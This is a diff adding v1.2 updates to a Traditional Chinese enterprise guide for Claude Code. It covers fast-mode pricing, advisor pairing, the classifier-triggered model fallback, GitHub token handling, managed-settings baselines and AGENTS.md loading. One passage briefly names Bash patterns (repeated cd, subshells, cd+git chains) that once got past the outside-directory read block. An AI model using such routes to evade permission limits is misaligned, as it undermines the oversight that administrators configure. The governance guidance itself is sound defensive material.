+| 機制 | 適用範圍 | 行為 |
+| --- | --- | --- |
+| managed settings 的 `maxEffortLevel` | **任何方案、任何 Provider**（含 Bedrock／Vertex／Foundry） | 在用戶端限制 effort 上限，可全域或依模型設定 |
+| 組織 effort 上限（Enterprise） | 僅 Anthropic API 認證的 session | 依自訂角色、依模型設定；超過上限的等級不會出現在 `/effort`，指定更高等級時改以上限執行（互動模式會顯示警告，`json` 輸出與背景 agent 則靜默套用） |
 
 ### 5.5 企業模型治理【Official】
 
@@ -1127,8 +1919,9 @@ Fast Mode **不是另一個模型**。它是 Claude Opus 的另一組 API 配置
 
 | 項目 | 內容 |
 | --- | --- |
-| **支援模型** | **僅 Opus 5 與 Opus 4.8**。Sonnet、Haiku 及其他模型皆不支援 |
-| **定價** | 輸入 **$10 / MTok**、輸出 **$50 / MTok**（Opus 5 與 Opus 4.8 相同），且**在完整 1M context window 內為單一費率**（不隨 context 長度分級） |
+| **支援模型** | **僅 Opus 5.5、Opus 5 與 Opus 4.8**。Sonnet、Haiku 及其他模型皆不支援 |
+| **定價** | **Opus 5.5：輸入 $8／輸出 $40 per MTok**；Opus 5 與 Opus 4.8：輸入 $10／輸出 $50 per MTok。**在完整 1M context window 內為單一費率**（不隨 context 長度分級） |
+| **雲端 session** | v2.1.271 起，cloud session 與 self-hosted runner 上也可使用（依主機的 fast mode 設定，或在 session 中輸入 `/fast`，且需組織允許） |
 | **切換方式** | CLI 輸入 `/fast` 按 Tab 切換；或在**使用者層**設定檔設 `"fastMode": true` |
 | **狀態顯示** | 啟用時提示列旁出現 `↯` 圖示；再次執行 `/fast` 可查詢目前狀態 |
 | **VS Code** | 擴充套件依循 `fastMode` 設定，並在模型支援時提供 **Toggle fast mode** 指令 |
@@ -1137,7 +1930,9 @@ Fast Mode **不是另一個模型**。它是 Claude Opus 的另一組 API 配置
 >
 > Opus 4.7 的 fast mode 於 **2026-06-25 棄用、2026-07-24 移除**。現在切換到 Opus 4.7 會**直接關閉** fast mode（v2.1.221 之前的版本不會關，導致 API 直接拒絕請求）。
 >
-> Fast mode 的預設模型也換過兩次：v2.1.142–2.1.153 為 Opus 4.7、v2.1.154–2.1.218 為 Opus 4.8、**v2.1.219 起為 Opus 5**。
+> Fast mode 的預設模型換過三次：v2.1.142–2.1.153 為 Opus 4.7、v2.1.154–2.1.218 為 Opus 4.8、v2.1.219–2.1.279 為 Opus 5、**v2.1.280 起為 Opus 5.5**（v1.2 更新）。
+>
+> 💰 **v1.2 成本提醒**：Opus 5.5 的 fast mode 單價（$8／$40）**低於** Opus 5（$10／$50）。若貴司預算模型以 v1.1 的 $10／$50 估算，升級到 v2.1.280 之後，同樣用量的 fast mode 花費約會**下降 20%**；但請記得「開啟時點決定一次性成本」的陷阱（5.11.3）不變。
 
 #### 5.11.2 🚨 企業最該先知道的三件事【Official】
 
@@ -1173,7 +1968,7 @@ Fast Mode **不是另一個模型**。它是 Claude Opus 的另一組 API 配置
 > 也就是說：**對話進行得越深，開 fast mode 的一次性成本越高。**
 >
 > - ✅ **正確做法**：需要 fast mode 就在 **session 一開始**就開。
-> - ❌ **錯誤做法**：跟 Claude 來回了 50 輪、context 累積到 300K token 之後才想「這段來加速一下」——這一下就是 300K token 以 $10/MTok 的未快取價重算。
+> - ❌ **錯誤做法**：跟 Claude 來回了 50 輪、context 累積到 300K token 之後才想「這段來加速一下」——這一下就是 300K token 以 fast mode 未快取價（Opus 5.5 為 $8/MTok、Opus 5 為 $10/MTok）重算。
 >
 > 📌 這筆費用**每段對話只收一次**。開了之後再關掉、稍後又開，不會重複收取。
 
@@ -1311,10 +2106,12 @@ Advisor 讓 Claude 在任務的**關鍵決策點**去諮詢第二個、通常更
 | **Sonnet 4.6** | Fable、Opus、Sonnet | |
 | **Sonnet 5** | Fable、Opus、**Sonnet 5** | **Sonnet 4.6 當顧問會被拒絕** |
 | **Opus 4.6** | Fable、Opus、Sonnet 5 | Sonnet 5 與 Opus 4.6 被視為能力相當，故可互為顧問 |
-| **Opus 4.7 或更新** | Fable、**Opus 4.7 或更新** | Opus 4.7+ 之間視為能力相當；**Opus 4.7 主模型配 Opus 4.6 或 Sonnet 5 顧問會被拒絕** |
+| **Opus 4.7 或 Opus 4.8** | Fable、**Opus 4.7 或更新** | **Opus 4.6 或 Sonnet 顧問會被拒絕** |
+| **Opus 5.5 或 Opus 5**（v1.2 更新） | Fable、**Opus 5 或更新** | **Opus 4.6 或 Sonnet 顧問會被拒絕**；🚨 **API 也會拒絕 Opus 4.7／4.8 顧問**。升級到 Opus 5.5 後，原本「Opus 5 主模型 + Opus 4.8 顧問」的組合會失效 |
 | **Fable 5.1 / Fable 5** | Fable 5.1，或**同版本** Fable | **Opus 或 Sonnet 當顧問一律被拒**；Fable 5 也**不能**當 Fable 5.1 的顧問 |
 
-- 別名 `fable` / `opus` / `sonnet` 解析為 Claude Code 內建的各家族預設版本，**會隨 Claude Code 改版而前進**；也可直接給完整 model ID（如 `claude-opus-5`）。
+- 別名 `fable` / `opus` / `sonnet` 解析為 Claude Code 內建的各家族預設版本，**會隨 Claude Code 改版而前進**；也可直接給完整 model ID（如 `claude-opus-5-5`）。
+- 📌 v2.1.276 修正：`ANTHROPIC_BASE_URL` 指向 proxy／gateway 時，所有請求因 `Input tag 'advisor_20260301'` 而 400 失敗的迴歸問題；v2.1.280 起，不支援 advisor 的 gateway 會自動改以不帶 advisor 的請求重試。
 - **Subagent 會繼承所設定的顧問**，並以**自己的模型**再跑一次配對檢查。
 - 配對不合時：顧問不會掛到主模型請求上（`/advisor` 輸出與通知會顯示），但**自身模型符合配對的 subagent 仍可能使用顧問**。
 - Fable 5.1 需 **v2.1.257+**，且兩個 Fable 模型都需要 Fable 存取權。
@@ -1393,18 +2190,20 @@ Advisor 讓 Claude 在任務的**關鍵決策點**去諮詢第二個、通常更
 
 #### 5.13.1 機制：不是拒絕，而是換一個模型重跑【Official】
 
-Automatic model fallback 是一種**基於內容的安全機制**：當安全分類器標記某個請求時，**Fable 模型與 Opus 5 會改用備援模型重跑該請求，而不是直接拒絕**。
+Automatic model fallback 是一種**基於內容的安全機制**：當安全分類器標記某個請求時，**Fable 模型、Opus 5.5 與 Opus 5 會改用備援模型重跑該請求，而不是直接拒絕**。
 
 📌 這與「模型過載或不可用時的[可用性 fallback](#53-模型設定的優先順序official)」是**完全不同的兩件事**，不要混淆。
 
-**會觸發分類器的模型**：**Fable 5.1、Fable 5、Opus 5**（其他模型不帶此分類器）。
+**會觸發分類器的模型**：**Fable 5.1、Fable 5、Opus 5.5（v1.2 新增）、Opus 5**（其他模型不帶此分類器）。
+
+> 🚨 **v1.2 重要影響**：v2.1.280 起 **Opus 5.5 是所有訂閱方案的預設模型**，而它也帶有這組分類器。這代表**過去只在少數人選用 Fable 時才會遇到的 fallback，現在會出現在每個使用預設模型的開發者身上**，資安團隊尤其明顯。
 
 **最常觸發的內容類別**：**資安（cybersecurity）**與**生物（biology）**。
 
 | 目前模型 | 被標記的類別 | 結果 |
 | --- | --- | --- |
-| **Fable 5.1 / Fable 5** | 生物 | 改用 **Opus 5** 重跑 |
-| **Fable 5.1 / Fable 5** | 資安 | 改用 **Opus 4.8** 重跑 |
+| **Fable 5.1 / Fable 5 / Opus 5.5** | 生物 | 改用 **Opus 5** 重跑 |
+| **Fable 5.1 / Fable 5 / Opus 5.5** | 資安 | 改用 **Opus 4.8** 重跑 |
 | **Opus 5** | 資安 | 改用 **Opus 4.8** 重跑 |
 | **Opus 5** | 生物 | 🚨 **以拒絕結束**（Opus 5 沒有生物類別的備援模型） |
 
@@ -1418,8 +2217,8 @@ Automatic model fallback 是一種**基於內容的安全機制**：當安全分
 
 🎯 **對企業的三個實際後果**：
 
-1. **貴司的資安工具 repo，開啟即可能自動降級模型。** 若團隊規範寫「一律使用 Opus 5」，實際執行的可能是 Opus 4.8，而**多數人不會注意到 transcript 裡的那行提示**。
-2. **Fable 做生物相關工作只有一次機會**：第一次被標記後 session 移到 Opus 5，**之後再被標記的生物請求會在那裡以拒絕收場**。
+1. **貴司的資安工具 repo，開啟即可能自動降級模型。** 若團隊規範寫「一律使用 Opus 5.5（預設）」，實際執行的可能是 Opus 4.8，而**多數人不會注意到 transcript 裡的那行提示**。
+2. **Fable 或 Opus 5.5 做生物相關工作只有一次機會**：第一次被標記後 session 移到 Opus 5，**之後再被標記的生物請求會在那裡以拒絕收場**。
 3. **需要 Fable 級能力做這類工作的組織，官方建議的路徑是向 Anthropic 客戶團隊詢問 trusted access 方案**，而不是嘗試繞過分類器。
 
 **診斷方法**：要確認是否為自家客製化內容（`CLAUDE.md`、skill、MCP、hook）造成觸發：
@@ -1669,6 +2468,25 @@ claude --teleport <session-id>
 - 安全隔離：每個 session 獨立 VM、預設限制網路、git 憑證留在沙箱外由 proxy 以 scoped credential 代理、**git push 限制在當前分支**、全操作稽核記錄、閒置後 VM 回收。
 
 > ⚠️ **組織 IP allowlist 會讓 Anthropic 託管的雲端 session 全部認證失敗**，因為它們是從 Anthropic 的基礎設施呼叫 API，不是從你的網路。Code Review 與 Anthropic 託管的 routines 也一樣。需聯繫 Anthropic 支援將這些服務排除在 IP allowlist 之外。
+
+#### 6.6.1 GitHub 連線的兩條路徑與企業控管【Official】（v1.2 新增）
+
+依官方新增的 `web-quickstart` 頁，雲端 session **一定要連結 GitHub**（不想連 GitHub 的組織，官方建議改用 Remote Control）。連結方式有兩種，治理意義差很多：
+
+| 路徑 | 權限範圍 | Team／Enterprise 前置條件 |
+| --- | --- | --- |
+| **瀏覽器 + Claude GitHub App** | 公開 repo 可 clone；**私有 repo 必須在其擁有者（帳號或組織）上安裝 Claude GitHub App**，且安裝範圍包含該 repo | Owner 在 **Admin settings > Connectors** 開啟 GitHub connector |
+| **`/web-setup`（讀取 `gh auth token`）** | 🚨 **該 `gh` token 能存取的所有 repo** | Owner 開啟 **Quick web setup** |
+
+> 🚨 **`/web-setup` 的資安意義**：它會把開發者本機的 `gh` token **傳送給 Anthropic**，以加密方式存在 claude.ai 帳號中，之後雲端 session 就以這個 token 存取 GitHub。這個 token 的權限通常遠大於「只安裝在特定 repo 的 GitHub App」。建議：
+>
+> - 高度管制組織**不要開啟 Quick web setup**，一律走 GitHub App（權限以 repo 為單位）。
+> - 若要開啟，請要求開發者使用**權限最小化的 fine-grained token**。
+> - 移除方式：在 claude.ai/customize/connectors 中斷 GitHub 連線（會同時刪除雲端 session 使用的 GitHub 憑證）；要讓 token 本身失效，必須到 GitHub 撤銷。
+>
+> 📌 **ZDR 組織無法使用 `/web-setup` 與任何雲端 session 功能。**
+
+其他 v1.2 相關變更：v2.1.272 起，組織環境可以在 **Admin settings → Cloud environments** 編輯；v2.1.278 修正了「Custom 網路存取但未填任何網域的環境，會靜默退回 Trusted」的問題（詳見第 [7.8 節](#78-cloud-environments雲端環境設定preview)）；v2.1.274 起，介面中的「Claude Code on the web」字樣統一改稱 **cloud session**。
 
 ### 6.7 Remote Control【Official】
 
@@ -1974,7 +2792,8 @@ Claude Code 先合併 `managed-settings.json`，再依**檔名字母序**合併�
       "Bash(kubectl *)",
       "Bash(terraform *)"
     ],
-    "disableBypassPermissionsMode": "disable"
+    "disableBypassPermissionsMode": "disable",
+    "blockReadsOutsideWorkingDirectories": true
   },
   "sandbox": {
     "enabled": true,
@@ -1996,7 +2815,9 @@ Claude Code 先合併 `managed-settings.json`，再依**檔名字母序**合併�
   "availableModels": ["opus", "sonnet", "haiku"],
   "enforceAvailableModels": true,
   "maxEffortLevel": "high",
-  "minimumVersion": "2.1.228",
+  "minimumVersion": "2.1.281",
+  "syncClaudeAiSkills": false,
+  "syncClaudeAiPlugins": false,
   "forceLoginMethod": "claudeai",
   "forceLoginOrgUUID": "<your-org-uuid>",
   "env": {
@@ -2006,11 +2827,25 @@ Claude Code 先合併 `managed-settings.json`，再依**檔名字母序**合併�
     "OTEL_METRICS_EXPORTER": "otlp",
     "OTEL_LOGS_EXPORTER": "otlp",
     "OTEL_EXPORTER_OTLP_PROTOCOL": "grpc",
-    "OTEL_EXPORTER_OTLP_ENDPOINT": "http://otel-collector.corp.example.com:4317"
+    "OTEL_EXPORTER_OTLP_ENDPOINT": "http://otel-collector.corp.example.com:4317",
+    "OTEL_LOG_MANAGED_SETTINGS": "1",
+    "OTEL_METRICS_INCLUDE_REPOSITORY": "true"
   },
   "claudeMd": "所有變更必須先在分支上進行，禁止直接推 main。\n完成任務前必須執行 `mvn verify`。\n禁止把任何憑證、token、連線字串寫進程式碼或設定檔。"
 }
 ```
+
+> 📌 **v1.2 對本範本的變更**：
+>
+> | 變更 | 理由 |
+> | --- | --- |
+> | 新增 `permissions.blockReadsOutsideWorkingDirectories: true` | 在**所有權限模式**下禁止讀取工作目錄以外的檔案，搭配 v2.1.273 的繞過修正後才完整（第 [15.7 節](#157-v12-新增的企業相關設定official)） |
+> | `minimumVersion` 由 `2.1.228` 提高為 **`2.1.281`** | 涵蓋 v2.1.269–281 的權限繞過修正（第 [2.3.2 節](#232-v21269--v21281-補充速覽officialv12-新增)）。要「拒絕啟動」而不只是提示升級，請改用 `requiredMinimumVersion`（第 [8.6 節](#86-版本控管與強制升級official)） |
+> | 新增 `syncClaudeAiSkills` / `syncClaudeAiPlugins: false` | 關閉從 claude.ai 帳號同步 skills／plugins 這條繞過私有 marketplace 的來源 |
+> | 新增 `OTEL_LOG_MANAGED_SETTINGS`、`OTEL_METRICS_INCLUDE_REPOSITORY` | 以遙測驗證政策是否生效，並依 repo 歸因成本（第 [41.6 節](#416-v12-補齊的遙測訊號與政策驗證officialv12-新增)） |
+> | `availableModels` 保留 `opus` | v2.1.280 起 `opus` 解析為 **Opus 5.5**（預設 effort 為 `medium`）；要以 `high` 執行，請在此檔加上頂層的 `"effortLevel": "high"`（第 [5.4 節](#54-effort-level推理投入程度official)） |
+>
+> ⚠️ `blockReadsOutsideWorkingDirectories` 會讓工具讀不到 `~/.gitconfig`、`~/.npmrc` 之類的家目錄設定檔，請在 PoC 期間確認開發流程不受影響，必要時以 `sandbox.filesystem.allowRead` 逐一開放。
 
 > ⚠️ **`sandbox.failIfUnavailable`**：設為 `true` 時，沙箱無法啟動就直接讓 Claude Code 失敗。這是給「把沙箱當安全閘門」的部署用的。但**在原生 Windows 上沙箱本來就不可用**，設 `true` 會讓 Windows 開發者完全無法啟動。若貴司是 Windows 為主，請維持 `false` 並改用容器策略。
 
@@ -2492,7 +3327,7 @@ exit 0
 
 ```json
 {
-  "requiredMinimumVersion": "2.1.228"
+  "requiredMinimumVersion": "2.1.281"
 }
 ```
 
@@ -4286,9 +5121,74 @@ See @README for project overview and @package.json for available npm commands.
 
 ### 14.8 AGENTS.md 相容【Official】
 
-> 🚨 **Claude Code 讀 `CLAUDE.md`，不讀 `AGENTS.md`。**
+> 🚨 **Version Note（v1.2 更正）**：v2.1.277 起，Claude Code **在沒有 `CLAUDE.md` 的專案中會直接讀 `AGENTS.md`**。v1.1 記載的「只讀 `CLAUDE.md`」已不正確。
 
-若 repo 已有 `AGENTS.md`：
+#### 14.8.1 預設讀取規則【Official】
+
+「有沒有 `CLAUDE.md`」的判定範圍是**工作目錄及其所有上層目錄**：
+
+| 會讓 Claude 改讀 `CLAUDE.md`、**跳過** `AGENTS.md` 的檔案 | **不影響**判定、會與 `AGENTS.md` 一起載入的檔案 |
+| --- | --- |
+| `CLAUDE.md`、`.claude/CLAUDE.md`、`CLAUDE.local.md` | `~/.claude/CLAUDE.md`、組織 managed `CLAUDE.md`、`.claude/rules/*.md` |
+
+判定為「讀 `AGENTS.md`」時的載入行為：
+
+| 時機 | 載入內容 |
+| --- | --- |
+| session 開始 | 工作目錄與上層目錄中的每一個 `AGENTS.md` 與 `.claude/AGENTS.md`；互動模式會顯示 `no CLAUDE.md found; AGENTS.md loaded: <path>` |
+| 在子目錄工作時 | 以 Read 工具開啟子目錄中的檔案，且該子目錄沒有任何一種 `CLAUDE.md` 時，載入該子目錄的 `AGENTS.md` |
+| 檔案內部 | `@path` 匯入會展開；`claudeMdExcludes` 會套用；會「跳過專案指示」的 subagent 也會跳過這些檔案 |
+| **永不讀取** | `AGENTS.local.md`、`AGENTS.override.md`、`.agents/` 目錄下的任何檔案 |
+
+#### 14.8.2 Project instructions 設定【Official】
+
+`/config` 的 **Project instructions** 可以改變上述預設：
+
+| 值 | 讀取內容 | 企業適用情境 |
+| --- | --- | --- |
+| `claude-md-or-agents-md` | **預設**。有 `CLAUDE.md` 就讀 `CLAUDE.md`，否則讀 `AGENTS.md` | 一般開發者 |
+| `claude-md-and-agents-md` | 同一目錄先讀 `CLAUDE.md` 再讀 `AGENTS.md`；已經載入過的 `AGENTS.md` 不會重讀 | 跨工具共用 repo，且團隊同時維護兩份檔案 |
+| `claude-md` | 只讀 `CLAUDE.md` | 要求與 v2.1.276 以前的行為完全一致 |
+| `managed-only` | 啟動時只載入組織 managed `CLAUDE.md` 與 auto memory；專案、local、使用者層的 `CLAUDE.md`、`.claude/rules/` 與所有 `AGENTS.md` 都不載入（讀取子目錄檔案時，該子目錄的 `CLAUDE.md` 與 path-scoped rules 仍會載入） | 🚨 **高敏感 repo 或稽核情境**：避免 repo 內容注入指示 |
+
+也可以寫在設定檔裡，掛在內建 `agents-md` plugin 的 `pluginConfigs` 下：
+
+```json
+{
+  "pluginConfigs": {
+    "agents-md@builtin": {
+      "options": { "instructionFiles": "claude-md-and-agents-md" }
+    }
+  }
+}
+```
+
+> ⚠️ 此值**只在 `~/.claude/settings.json`、`--settings` 檔或 managed settings 中有效**，寫在專案層與 local 設定檔中會被忽略。這是刻意的設計：**repo 不能自行決定要載入哪些指示檔**。
+
+#### 14.8.3 何時讀不到 AGENTS.md【Official】
+
+以下情況 Claude **只讀 `CLAUDE.md`**，而且 `/config` 中不會出現 Project instructions：
+
+- Claude Code 版本低於 v2.1.277
+- 在 `/plugin` 停用了內建的 `agents-md` plugin
+- 從 v2.1.276 以前升級後的**第一個** session（部分情況；下一個 session 起生效）
+- **v2.1.281 之前**，Amazon Bedrock 或關閉遙測的 session
+
+#### 14.8.4 AGENTS.md 與 CLAUDE.md 的行為差異【Official】
+
+經由 Project instructions 直接讀取的 `AGENTS.md`，有三點與 `CLAUDE.md` 不同：
+
+| 項目 | `CLAUDE.md` | 直接讀取的 `AGENTS.md` |
+| --- | --- | --- |
+| `InstructionsLoaded` hook | 會觸發 | 🚨 **不會觸發**（經 `CLAUDE.md` 匯入或 symlink 時才會） |
+| `--add-dir` 加入的目錄（設定 `CLAUDE_CODE_ADDITIONAL_DIRECTORIES_CLAUDE_MD` 時） | 會載入該目錄的 `CLAUDE.md` | **不會**載入該目錄的 `AGENTS.md` |
+| 匯入工作目錄以外的檔案 | 會詢問是否核准外部匯入 | 只有在本專案已核准過外部匯入時才載入，**且不再詢問** |
+
+> 🚨 **稽核影響**：若企業以 `InstructionsLoaded` hook 記錄「每個 session 載入了哪些指示檔」（第 [19 章](#19-hooks)），**直接讀取的 `AGENTS.md` 不會出現在稽核紀錄中**。這是改用 `@AGENTS.md` 匯入的另一個理由。
+
+#### 14.8.5 企業標準寫法【建議】
+
+跨工具共用的 repo 請一律使用「`CLAUDE.md` 匯入 `AGENTS.md`」：
 
 ```markdown
 <!-- CLAUDE.md -->
@@ -4299,15 +5199,25 @@ See @README for project overview and @package.json for available npm commands.
 在 `src/billing/` 下的變更請使用 plan mode。
 ```
 
-symlink 也可行（不需加 Claude 專屬內容時）：
+理由：
 
-```bash
-ln -s AGENTS.md CLAUDE.md
-```
+1. **所有版本、所有 Provider 行為一致**，不受 v2.1.277／v2.1.281 版本門檻影響。
+2. **不受 `CLAUDE.local.md` 影響**：直接讀取模式下，開發者新增個人的 `CLAUDE.local.md`，就會讓 `AGENTS.md` 靜默失效。
+3. **`InstructionsLoaded` hook 會觸發**，稽核紀錄完整。
+4. 匯入不會造成重複載入，不論 Project instructions 設成哪個值。
 
-> ⚠️ **Windows 建立 symlink 需要系統管理員權限或開發者模式**，企業環境請一律改用 `@AGENTS.md` 匯入。
+> ⚠️ **不要用 symlink（`ln -s AGENTS.md CLAUDE.md`）**：Windows 建立 symlink 需要系統管理員權限或開發者模式；Git 在未啟用 `core.symlinks` 時會把它 checkout 成只有一行的純文字檔；而且 Edit／Write 工具**拒絕透過 symlink 寫入**，會改去編輯 `AGENTS.md` 本身。
 
-驗證方式：下一個 session 執行 `/context`，確認 `CLAUDE.md` 出現在 **Memory files** 之下。
+#### 14.8.6 移除舊的變通做法【Official】
+
+| 舊做法 | 升級到 v2.1.277+ 後怎麼處理 |
+| --- | --- |
+| `CLAUDE.md` 內寫 `@AGENTS.md` | **保留**（本手冊的標準寫法），不會重複載入 |
+| `CLAUDE.md` 用文字「請閱讀 AGENTS.md」 | 改成 `@AGENTS.md` 匯入。用文字提示時，Claude 只在自己決定開檔時才會看到內容 |
+| `CLAUDE.md` 是指向 `AGENTS.md` 的 symlink | 可以保留或刪除，內容只會讀一次；企業建議改成匯入 |
+| 用 `SessionStart` hook 印出 `AGENTS.md` | 🚨 **移除**，否則 context 中會有兩份相同內容 |
+
+驗證方式：下一個 session 執行 `/context`，確認 `CLAUDE.md`（或 `AGENTS.md`）出現在 **Memory files** 之下。
 
 ### 14.9 `.claude/rules/`：讓 CLAUDE.md 保持精簡【Official】
 
@@ -4845,7 +5755,54 @@ claude --safe-mode     # 停用所有客製化啟動，用來確認問題是否�
 claude --debug --debug-file ./debug.txt
 ```
 
-### 15.7 本章實務案例
+### 15.7 v1.2 新增的企業相關設定【Official】
+
+本節整理 v1.1 之後新增，或本手冊先前未涵蓋、但與企業治理直接相關的設定鍵。表中的「可設定位置」欄非常重要：**凡是只允許 user／managed 的鍵，都是官方刻意防止「clone 下來的 repo 改寫你的環境」**。
+
+| 設定鍵 | 作用 | 可設定位置 | 版本 |
+| --- | --- | --- | --- |
+| `attribution.commit` / `attribution.pr` / `attribution.sessionUrl` | 修改或隱藏 commit trailer、PR 描述署名、雲端 session 連結 | 任何設定檔 | 取代已棄用的 `includeCoAuthoredBy` |
+| `"attribution": false` | **一次隱藏所有**署名 | 任何設定檔 | v2.1.281+；⚠️ 舊版 CLI 會**略過整個含此值的設定檔**，跨版本共用的檔案請改用物件形式 |
+| `syncClaudeAiSkills` / `syncClaudeAiPlugins` | 設為 `false` 時，停止把 claude.ai 帳號啟用的 skills／plugins 同步到終端機，並停止載入已同步者（skills 會移到 `~/.claude/skills/.trash/`） | user、local、managed、`--settings`（**repo 無法替你關閉**） | v2.1.275+ |
+| `modelPicker` | 自訂 `/model` picker 的清單、順序與標籤；`replaceBuiltInOptions: true` 時只顯示自訂清單 | user、managed、`--settings`（**專案層被忽略**） | v2.1.242+ |
+| `permissions.blockReadsOutsideWorkingDirectories` | 在**所有權限模式（含 bypass）**下，禁止 Read／Grep／Glob／LSP 讀取工作目錄以外的路徑；Bash 讀取時一律詢問 | 任何設定檔；**任一來源為 `true` 即生效**，repo 可以開啟、不能解除 | v2.1.257+ |
+| `prUrlTemplate` | 把 PR 連結指向內部 code review 系統 | 任何設定檔 | — |
+| `includeGitInstructions` | 移除內建的 commit／PR 指示（改由企業 CLAUDE.md 或 skill 提供） | 任何設定檔 | — |
+| `bashEditDiffEnabled` | Bash 工具處理檔案編輯時，於結果中附上變更 diff | 任何設定檔 | v2.1.269+ |
+
+> 🚨 **`syncClaudeAiSkills` 是 v1.2 最需要納入基準政策的新鍵**
+>
+> v2.1.275 起，以 claude.ai 帳號登入的終端機 session，會**自動下載**該帳號在 claude.ai 啟用的 skills（放在 `~/.claude/skills/synced/`）與 plugins。從治理角度來看，這是一條**繞過企業私有 marketplace 的擴充來源**。若企業政策要求「所有 skill 都必須經由內部 marketplace 審查」，請在 managed settings 加入：
+>
+> ```json
+> {
+>   "syncClaudeAiSkills": false,
+>   "syncClaudeAiPlugins": false
+> }
+> ```
+>
+> 📌 v2.1.273 起，組織在 claude.ai 關閉 Skills 功能後，已同步的 skills 會移到可復原的垃圾桶，而不是繼續可用。
+
+> ✅ **`blockReadsOutsideWorkingDirectories` 與 auto mode 的互動**：auto mode 在第一次要讀取工作目錄以外的檔案時會詢問，若使用者選擇封鎖，Claude Code 會自動把此鍵寫成 `true`。啟用沙箱時，這個鍵也會拒絕沙箱指令讀取家目錄與掛載磁碟的根目錄；例如需要 `~/.gitconfig` 時，請用 `sandbox.filesystem.allowRead` 個別開放。v2.1.271／v2.1.273 修正了多個 Bash 指令（多次 `cd`、subshell、`cd`+`git` 串接）繞過此設定的問題，**啟用此鍵的組織應同時要求 v2.1.273 以上**。
+
+#### 15.7.1 `--restricted`：共用機器上的評估模式【Official】
+
+`claude --restricted`（v2.1.248+）專為「評估框架在共用機器上驅動 `claude`」的情境設計：
+
+- 移除會執行指令或程式碼的內建工具，以及 WebFetch（除非在 `--tools` 中逐一列名，`default` 預設組不算）
+- 檔案工具只能存取工作目錄
+- 只載入 managed settings 與 `--settings`，**不讀該機器的 user 與 project 設定**
+- 拒絕 `bypassPermissions`，也拒絕建立雲端 session
+
+✅ **企業用途**：模型評測、prompt 回歸測試、plugin eval（第 [21.12 節](#2112-plugin-evals以-eval-套件驗證-pluginofficialv12-新增)）若跑在共用的 CI runner 或評測主機上，一律加 `--restricted`。
+
+#### 15.7.2 官方的三份設定範例（settings-example）【Official】
+
+官方新增的 `settings-example` 頁面，提供三份「看起來像真的」設定檔：開發者的 `~/.claude/settings.json`、團隊提交進 repo 的 `.claude/settings.json`，以及組織的 `managed-settings.json`。每份都附有逐鍵註解版。
+
+> ⚠️ 官方明確說明：**這三份都不是建議基準**，只是示範檔案的形狀；每個值都應回到 `settings-reference` 查型別、預設值與可設定位置。另外，**settings 檔不接受註解**，複製時請使用不含註解的版本。企業基準政策請以本手冊第 [7.5 節](#75-企業基準政策範本建議) 為起點。
+
+### 15.8 本章實務案例
 
 **案例：`.claude/settings.local.json` 意外進了版控**
 
@@ -4868,7 +5825,7 @@ claude --debug --debug-file ./debug.txt
 
 3. 加一個 pre-commit hook 或 CI 檢查，禁止 `settings.local.json` 進版控。
 
-### 15.8 本章注意事項
+### 15.9 本章注意事項
 
 > 🚨 **`.claude/settings.json` 會進版控，等於「任何能 commit 的人都能改變 Claude 的行為」。** 這個檔案應該納入 CODEOWNERS 保護。
 >
@@ -5724,6 +6681,35 @@ Given / When / Then 三段，用空行分隔，不寫註解標籤。
 - 只是要讓**檔案編輯不互相干擾** → **Worktree**
 - 你自己開的多個 session 之間要傳結論 → **Cross-session messaging**
 
+#### 18.1.1 官方「五種平行執行方式」的新分類【Official】（v1.2 新增）
+
+官方新增的 `agents` 頁，改從「**誰來協調工作**」與「**工作在本機還是雲端**」重新分類。與上表最大的不同是：把 **Skills 與 Worktrees 移出**（它們是輔助工具，不是執行方式），並**新增 Projects**：
+
+| 方式 | 給你什麼 | 何時使用 | 執行位置 | 狀態 |
+| --- | --- | --- | --- | --- |
+| **Subagents** | 在同一 session 內委派側任務，於獨立 context 完成後回傳摘要 | 側任務會用搜尋結果、log 或檔案內容淹沒主對話 | 本機 | GA |
+| **Agent view** | `claude agents` 一個畫面派發並監看背景 session | 多個獨立任務，想交出去、需要時才介入 | 本機 | 【Preview】 |
+| **Agent teams** | 由 lead 管理、共享任務清單並互相傳訊的多個 session | 要讓 Claude 拆解、分派並同步多個工作者 | 本機或雲端 session 內 | 【Preview】預設關閉 |
+| **Projects** | claude.ai/code 或 Desktop 上的一段長期對話；Claude 開啟平行的雲端 thread，並共享 repo、指示與記憶 | 跨數天或數週、關機後也要繼續跑的工作 | **雲端** | 【Preview】Pro／Max public beta |
+| **Dynamic workflows** | 由腳本執行大量 subagent 並交叉驗證結果 | 超過少數 subagent 能處理的規模，或需要交叉驗證的發現 | 本機 | GA |
+
+三個選型問題：
+
+1. **誰協調？** Claude 在單一對話內委派 → Subagents；你交辦、之後再回來看 → Agent view；Claude 規劃並監督一群工作者 → Agent teams；由腳本掌握計畫 → Workflows。
+2. **工作者需要彼此溝通嗎？** 你自己開的 session 之間用 cross-session messaging；subagent 只回報給建立它的對話；agent view 的 session 只回報給你；teammate 之間可以直接傳訊。
+3. **會碰同一批檔案嗎？** 用 worktree 隔離。🚨 **Agent teams 不會自動把 teammate 放進 worktree**，必須自行切分檔案所有權。
+
+查看執行中工作的指令對照：
+
+| 指令 | 看什麼 |
+| --- | --- |
+| `claude agents` | 所有背景 session 的狀態（agent view） |
+| `/tasks` | 目前 session 背景中的所有項目（含已完成的 subagent），可查看、附加或停止 |
+| `/workflows` | Dynamic workflow 的執行階段與完成數 |
+| `/agents` | ⚠️ v2.1.198 起**不再開啟面板**，只提示 subagent 檔案位置；與 `claude agents` 無關 |
+
+> 📌 **易混淆的「分岔」指令**：`/subtask` 啟動一個**繼承完整對話的 forked subagent**；`/fork` 把整個 session 複製成一個**並行的背景 session**。關閉 agent view 時，forked subagent 的指令改為 `/fork`，此時 `/subtask` 不可用。
+
 ### 18.2 Worktrees【Official】
 
 ```bash
@@ -6193,7 +7179,55 @@ JavaScript to TypeScript, working on each file in its own isolated copy
 
 在 git repository 中，`/batch` 會把變更拆給 **5 到 30 個 subagent**，**每個在自己的 worktree 中工作並開一個 PR**。
 
-### 18.8 本章實務案例
+### 18.8 Claude Projects（雲端長期專案協調）【Preview】（v1.2 新增）
+
+#### 18.8.1 是什麼【Official】
+
+**Project** 是一段持續進行的對話：你把工作丟進來，Claude 為每項任務開一個 **thread**。每個 thread 都是一個**雲端 session**，彼此平行執行，**關掉筆電後仍會繼續**，也可以從手機查看與引導。所有 thread 共享專案的 repositories、指示與記憶。
+
+> 🚨 **企業可用性（2026-09 查證）**
+>
+> - 目前是 **Pro 與 Max 方案的 public beta**，且逐步開放。
